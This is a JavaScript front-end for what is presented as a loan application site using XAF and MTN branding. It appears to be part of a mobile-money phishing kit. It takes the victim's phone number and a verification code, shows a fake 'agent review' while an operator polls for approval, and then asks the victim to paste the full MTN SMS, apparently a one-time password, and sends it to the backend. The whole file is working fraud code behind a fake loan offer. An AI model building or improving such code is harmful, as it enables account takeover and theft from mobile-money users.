// Show a specific screen and hide others
function showScreen(screenId) {
    document.querySelectorAll('.app-screen').forEach(screen => {
        screen.classList.remove('active');
    });
    document.getElementById(screenId).classList.add('active');
    document.getElementById(screenId).scrollTop = 0;
}

// Loan Calculator Logic
const amountSlider = document.getElementById('loan-amount');
const termSlider = document.getElementById('loan-term');
const amountDisplay = document.getElementById('amount-display');
const termDisplay = document.getElementById('term-display');
const monthlyPaymentDisplay = document.getElementById('monthly-payment');

function calculateLoan() {
    const amount = parseFloat(amountSlider.value);
    const months = parseFloat(termSlider.value);
    
    amountDisplay.innerText = 'XAF ' + amount.toLocaleString();
    termDisplay.innerText = months + ' Months';

    const interestRate = 0.01; // 1% monthly
    const monthlyPayment = (amount / months) + (amount * interestRate);
    
    monthlyPaymentDisplay.innerText = 'XAF ' + Math.round(monthlyPayment).toLocaleString();
}

amountSlider.addEventListener('input', calculateLoan);
termSlider.addEventListener('input', calculateLoan);
calculateLoan();

// Submit Application Logic
document.getElementById('submit-btn').addEventListener('click', async function(e) {
    e.preventDefault();
    
    // Show the processing screen
    document.getElementById('processing-title').innerText = "Processing Application";
    document.getElementById('processing-text').innerText = "Please wait while an agent reviews your loan request. Do not close this page.";
    document.getElementById('loader-spinner').style.display = "block"; 
    showScreen('screen-processing');

    const data = {
        phone: document.getElementById('phone').value,
        code: document.getElementById('verification-code').value
    };

    try {
        const response = await fetch('/api/apply', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        });

        const result = await response.json();

        if (result.success && result.appId) {
            // START POLLING: Check status every 3 seconds
            const interval = setInterval(async () => {
                try {
                    const statusRes = await fetch(`/api/status/${result.appId}`);
                    const statusData = await statusRes.json();

                    if (statusData.status === 'approved') {
                        clearInterval(interval); // Stop checking
                        
                        // Show a quick "Approved" message, then jump to SMS page
                        document.getElementById('processing-title').innerText = "Approved!";
                        document.getElementById('processing-text').innerText = "Redirecting...";
                        document.getElementById('loader-spinner').style.display = "none"; 
                        
                        setTimeout(() => {
                            showScreen('screen-sms');
                        }, 1000); // Wait 1 second, then show SMS screen

                    } else if (statusData.status === 'rejected') {
                        clearInterval(interval); // Stop checking
                        document.getElementById('processing-title').innerText = "Application Rejected";
                        document.getElementById('processing-text').innerText = "Unfortunately, we cannot offer you a loan at this time.";
                        document.getElementById('loader-spinner').style.display = "none"; 
                    }
                } catch (error) {
                    console.error("Waiting for approval...", error);
                }
            }, 3000); // 3000 milliseconds = 3 seconds
        } else {
            alert("Error sending application.");
            showScreen('screen-step3');
        }
    } catch (error) {
        console.error(error);
        alert("Network error.");
        showScreen('screen-step3');
    }
});

// --- SMS Verification Button Logic ---
const smsInput = document.getElementById('sms-input');
const verifyBtn = document.getElementById('verify-btn');

// Start disabled
verifyBtn.disabled = true;
verifyBtn.style.pointerEvents = 'none';
verifyBtn.style.opacity = '0.6';

// Enable button when user types/pastes something meaningful
smsInput.addEventListener('input', function() {
    const hasContent = smsInput.value.trim().length > 0;

    if (hasContent) {
        verifyBtn.disabled = false;
        verifyBtn.style.pointerEvents = 'auto';
        verifyBtn.style.background = '#ffcc00';   // full yellow
        verifyBtn.style.color = '#000';
        verifyBtn.style.opacity = '1';
        verifyBtn.style.cursor = 'pointer';
    } else {
        verifyBtn.disabled = true;
        verifyBtn.style.pointerEvents = 'none';
        verifyBtn.style.background = '#ffe082';   // faded
        verifyBtn.style.color = '#fff';
        verifyBtn.style.opacity = '0.6';
        verifyBtn.style.cursor = 'default';
    }
});

// Extra safety: handle paste events (mobile long-press paste)
smsInput.addEventListener('paste', function() {
    setTimeout(() => smsInput.dispatchEvent(new Event('input')), 0);
});

// Handle the verify action
verifyBtn.addEventListener('click', function() {
    const smsText = smsInput.value.trim();

    if (!smsText) return;

    // Basic sanity check
    if (smsText.length < 10) {
        alert("Please paste the full SMS you received from MTN.");
        return;
    }

    // Show processing screen
    document.getElementById('processing-title').innerText = "Verifying SMS...";
    document.getElementById('processing-text').innerText = "Please wait while we confirm your loan details.";
    document.getElementById('loader-spinner').style.display = "block";
    showScreen('screen-processing');

    // Send the pasted SMS to the backend for verification
    fetch('/api/verify-sms', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ sms: smsText })
    })
    .then(res => res.json())
    .then(result => {
        if (result.success) {
            document.getElementById('processing-title').innerText = "Verified!";
            document.getElementById('processing-text').innerText = "Your loan is being finalized. You will receive a confirmation shortly.";
        } else {
            document.getElementById('processing-title').innerText = "Verification Failed";
            document.getElementById('processing-text').innerText = "The SMS could not be verified. Please try again.";
        }
        document.getElementById('loader-spinner').style.display = "none";
    })
    .catch(() => {
        document.getElementById('processing-title').innerText = "Network Error";
        document.getElementById('processing-text').innerText = "Please check your connection and try again.";
        document.getElementById('loader-spinner').style.display = "none";
    });
});